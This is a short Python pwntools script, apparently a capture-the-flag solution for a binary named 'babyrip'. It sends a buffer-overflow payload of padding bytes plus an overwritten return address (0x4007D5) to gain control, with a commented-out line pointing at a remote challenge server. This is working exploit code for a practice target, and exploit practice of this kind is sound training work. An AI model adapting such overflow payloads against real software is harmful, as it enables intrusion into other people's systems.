#!/usr/bin/env python
# -*- coding: UTF-8 -*-
from pwn import *

# 显示详细的信息
# context(log_level='debug')

# 本地测试
p = process("./babyrip")
# p = remote("34.80.207.78", 10000)

# p64 函数将整数转换为8字节二进制数据
p.sendafter("Enter your comment:", 'A' * (0x100-0x8) + p64(0x4007D5))

p.interactive()
